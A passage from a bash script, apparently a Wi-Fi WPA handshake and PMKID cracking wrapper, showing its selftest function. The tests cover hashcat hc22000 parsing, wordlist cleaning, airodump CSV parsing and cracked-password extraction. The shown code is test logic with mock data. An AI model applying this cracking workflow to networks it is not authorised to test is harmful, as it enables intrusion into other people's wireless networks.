f:aa:ab:ac:ad:ae:af:b0:b1:b2:b3:b4:b5:b6:b7:b8:b9:ba:bb:bc:bd:be:bf:c0:c1:c2:c3:c4:c5:c6:c7:c8:c9:ca:cb:cc:cd:ce:cf:d0:d1:d2:d3:d4:d5:d6:d7:d8:d9:da:db:dc:dd:de:df:e0:e1:e2:e3:e4:e5:e6:e7:e8:e9:ea:eb:ec:ed:ee:ef:f0:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:fb:fc:fd:fe:ff:01:02:03:04:05:06:07:08:09:0a:0b:0c:0d:0e:0f:10:11:12:13:14:15:16:17:18:19:1a:1b:1c:1d:1e:1f:20:21:22:23:24:25:26:27:28:29:2a:2b:2c:2d:2e:2f:30:31:32:33:34:35:36:37:38:39:3a:3b:3c:3d:3e:3f:40:41:42:43:44:45:46:47:48:49:4a:4b:4c:4d:4e:4f:50:51:52:53:54:55:56:57:58:59:5a:5b:5c:5d:5e:5f:60:61:62:63:64:65:66:67:68:69:6a:6b:6c:6d:6e:6f:70:71:72:73:74:75:76:77:78:79:7a:7b:7c:7d:7e:7f:80:81:82:83:84:85:86:87:88:89:8a:8b:8c:8d:8e:8f:90:91:92:93:94:95:96:97:98:99:9a:9b:9c:9d:9e:9f:aa:ab:ac:ad:ae:af:b0:b1:b2:b3:b4:b5:b6:b7:b8:b9:ba:bb:bc:bd:be:bf:c0:c1:c2:c3:c4:c5:c6:c7:c8:c9:ca:cb:cc:cd:ce:cf:d0:d1:d2:d3:d4:d5:d6:d7:d8:d9:da:db:dc:dd:de:df:e0:e1:e2:e3:e4:e5:e6:e7:e8:e9:ea:eb:ec:ed:ee:ef:f0:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:fb:fc:fd:fe:ff:0001:0203:0405:0607:0809:0a0b:0c0d:0e0f*1122:3344:5566:7788:99aa:bbcc:ddee:ff00:1122:3344:5566:7788:99aa:bccc*ff00:1122:3344:5566:7788:99aa:bccc:dd00" \
    > "$T/hc22000.sample"

  # --- 测试 1: F-2 PMKID 判断
  grep -q 'WPA\*01\*pmkid' "$T/hc22000.sample" && r=0 || r=1
  ck "F-2 PMKID 字段前缀判断" $r

  # --- 测试 2: F-6 握手计数（aircrack '(2 handshakes)' 解析）
  hsk_ac=$( "$T/bin/aircrack-ng" "$T/nothing" 2>/dev/null | grep -oE '\([0-9]+ handshakes?\)' | grep -oE '[0-9]+' | head -1 || true )
  [ "${hsk_ac:-0}" = "2" ] && r=0 || r=1
  ck "F-6 aircrack '(N handshakes)' 解析" $r

  # --- 测试 3: H-8 ESSID hex 提取（'*' 分隔 + python3 解码）
  essid_hex=$(head -1 "$T/hc22000.sample" | awk -F'*' '{print $6}' | sed 's/^ssid://')
  dec=$(python3 -c 'import sys
h=sys.argv[1]
while len(h) >= 2 and h.endswith("00"):
    h = h[:-2]
if len(h) % 2: h = h + "0"
try: b=bytes.fromhex(h)
except Exception: sys.exit(0)
s=b.decode("utf-8",errors="replace").replace("\x00","")
sys.stdout.write(s)' "$essid_hex" 2>/dev/null || true)
  [ "$dec" = "MyWiFi" ] && r=0 || r=1
  ck "H-8 ESSID hex 解码 (期望 MyWiFi, 得 '$dec')" $r

  # --- 测试 4: H-5 字典清洗
  printf 'short\r\npassword123\r\nmy wifi pass\r\n\r\n' > "$T/raw.dict"
  python3 -c 'import sys; sys.stdout.write("6"*64 + chr(10))' >> "$T/raw.dict"   # 64 位 → 应丢弃
  tr -d '\r' < "$T/raw.dict" | grep -aE '[[:print:]]+$' | grep -avE '[[:cntrl:]]' \
    | awk 'length($0) >= 8 && length($0) <= 63' | LC_ALL=C sort -u > "$T/clean.dict"
  n=$(wc -l < "$T/clean.dict")
  # 期望: password123, my wifi pass → 2 行（short<8丢弃, 空行丢弃, 64位丢弃）
  [ "$n" -eq 2 ] && r=0 || r=1
  ck "H-5 清洗: CRLF/空行/长度8-63/去重 (期望2行, 得$n)" $r
  grep -q 'my wifi pass' "$T/clean.dict" && r=0 || r=1
  ck "H-5 保留含空格密码" $r

  # --- 测试 5: F-1 build_wordlist 无 stdout 污染（source 函数段执行）
  OUT_DIR_TEST="$T/out"; mkdir -p "$OUT_DIR_TEST"
  QUIET_TEST_SAVE=$QUIET; QUIET=1
  # 提取并执行 clean_wordlist + build_wordlist 函数定义
  eval "$(sed -n '/^clean_wordlist() {/,/^}/p; /^build_wordlist() {/,/^}/p' "$(readlink -f "${BASH_SOURCE[0]}")")"
  USER_WORDLIST="$T/clean.dict"
  # mock log/logw（函数内调用）
  log() { :; }; logw() { :; }; die() { echo "DIE: $*"; exit 9; }
  stdout_out=$(OUT_DIR="$OUT_DIR_TEST" build_wordlist 2>/dev/null)
  QUIET=$QUIET_TEST_SAVE
  [ -z "$stdout_out" ] && r=0 || r=1
  ck "F-1 build_wordlist stdout 无输出 (得: '${stdout_out:0:40}')" $r
  [ -s "$OUT_DIR_TEST/combined.dict" ] && r=0 || r=1
  ck "F-1 combined.dict 已生成" $r

  # --- 测试 6: H-7 命中提取（冒号后整行，含空格）
  echo "WPA*01*5678:my wifi pass" > "$T/hit"
  firstline=$(head -1 "$T/hit")
  case "$firstline" in
    *:*)
      prefix="${firstline%%:*}"
      if [[ "$prefix" =~ ^(WPA|WPA-1)(\*[0-9a-fA-F]+)+$ ]]; then
        pw="${firstline#*:}"
      else
        pw="$firstline"
      fi
      ;;
    *)   pw="$firstline" ;;
  esac
  [ "$pw" = "my wifi pass" ] && r=0 || r=1
  ck "H-7 空格密码提取 (得 '$pw')" $r

  # --- 测试 7: F-5 分片未生成检测
  workdir="$T/noshards"
  mkdir -p "$workdir"
  shards=( "$workdir"/cap-*.cap )
  if [ ${#shards[@]} -eq 1 ] && [ ! -e "${shards[0]}" ]; then r=0; else r=1; fi
  ck "F-5 无分片时正确判定 (shards=${#shards[@]}, [0]='${shards[0]}')" $r

  # --- 测试 10: V4-F1 CSV 解析（AP/Station 行区分、列位正确）
  local test_csv="$T/scan-test.csv"
  cat > "$test_csv" <<'CSVEOF'
BSSID,First time seen,Last time seen,channel,Speed,Privacy,Cipher,Authentication,Power,# beacons,# IV,LAN IP,ID-length,ESSID
00:11:22:33:44:55,2024-01-01 00:00:00,2024-01-01 00:00:10,6,54,WPA2,CCMP,PSK,52,100,0,192.168.1.1,6,TestNet
AA:BB:CC:DD:EE:FF,2024-01-01 00:00:00,2024-01-01 00:00:10,11,54,OPN,, ,45,50,0,,0,
11:22:33:44:55:66,2024-01-01 00:00:01,2024-01-01 00:00:11,-54.5,4,WPA2,CCMP,PSK,52,100,0,192.168.1.1,6,TestNet
CSVEOF
  local csv_out
  csv_out=$(python3 - "$test_csv" <<'PY' 2>/dev/null
import csv, re, sys
bssid_re = re.compile(r'^[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}$')
clients = {}
aps = {}
with open(sys.argv[1], newline='', encoding='utf-8', errors='replace') as f:
    for line in f:
        line = line.strip()
        if not line: continue
        try:
            r = next(csv.reader([line]))
        except Exception:
            continue
        mac = r[0].strip() if r else ''
        if not mac or not bssid_re.match(mac): continue
        if len(r) >= 14:
            if mac not in aps:
                auth  = r[7].strip() if len(r) > 7 else ''
                power = r[8].strip() if len(r) > 8 else ''
                ssid  = r[13].strip() if len(r) > 13 else ''
                aps[mac] = dict(ch=r[3].strip(), auth=auth, power=power, ssid=ssid)
        elif 7 <= len(r) <= 9:
            b = r[5].strip() if len(r) > 5 else ''
            if b and bssid_re.match(b):
                clients[b] = clients.get(b, 0) + 1
for b, a in aps.items():
    c = clients.get(b, 0)
    print(f"{b}\t{a['ch']}\t{a['auth']}\t{a['power']}\t{c}\t{a['ssid']}")
PY
)
  # 验证: TestNet 在 6 信道，power=52，有 1 个客户端（Station 行 r[5]=00:11:22:33:44:55）
  local testnet_line
  testnet_line=$(echo "$csv_out" | grep '00:11:22:33:44:55')
  echo "$testnet_line" | grep -q "6" && echo "$testnet_line" | grep -q "PSK" && \
  echo "$testnet_line" | grep -q "52" && echo "$testnet_line" | grep -q "TestNet" && r=0 || r=1
  ck "V4-F1 CSV AP 行解析 (ch=6, auth=PSK, power=52, ssid=TestNet)" $r

  # --- 测试 11: V4-F4 --combine 参数解析
  local cl="" cr=""
  # 模拟参数解析
  local args=(--combine left.txt right.txt)
  local i=0
  while [ $i -lt ${#args[@]} ]; do
    case "${args[$i]}" in
      --combine) ((i++)); cl="${args[$i]:-}"; ((i++)); cr="${args[$i]:-}" ;;
    esac
    ((i++))
  done
  [ "$cl" = "left.txt" ] && [ "$cr" = "right.txt" ] && r=0 || r=1
  ck "V4-F4 --combine 参数解析 (L=left.txt R=right.txt, 得 L=$cl R=$cr)" $r

  # --- 测试 12: V4-F8 --bssid 格式校验
  local bad_bssid="00:11:22:33:44"  # 只有 5 段
  [[ "$bad_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && r=1 || r=0
  ck "V4-F8 非法 BSSID 被拒绝" $r
  local good_bssid="00:11:22:33:44:55"
  [[ "$good_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && r=0 || r=1
  ck "V4-F8 合法 BSSID 通过" $r

  # --- 测试 13: V4-H8 命中提取（hash 含 MAC 冒号）
  # hashcat -m 22000 实际输出: "<hash>:<candidate>" 其中 hash 最后一个冒号后是密码
  # 用 rsplit 找最后一个冒号
  local hitline="WPA*02*mic*00:11:22:33:44:55*aa:bb:cc:dd:ee:ff:my wifi pass"
  local firstline="$hitline"
  local pw_test
  pw_test=$(echo "$firstline" | python3 -c 'import sys; line=sys.stdin.read().strip(); parts=line.rsplit(":",1); print(parts[1] if len(parts)==2 else line)')
  [ "$pw_test" = "my wifi pass" ] && r=0 || r=1
  ck "V4-H8 命中提取（hash 含 MAC 冒号，得 '$pw_test'）" $r

  echo "== selftest 结果: PASS=$pass FAIL=$fail"
  rm -rf "$T"
  [ "$fail" -eq 0 ]
}

# 入口：若 --selftest 则只跑自测（不依赖 root，不跑 main）
if [ "$SELFTEST" -eq 1 ]; then
  selftest
  exit $?
fi

main "$@"
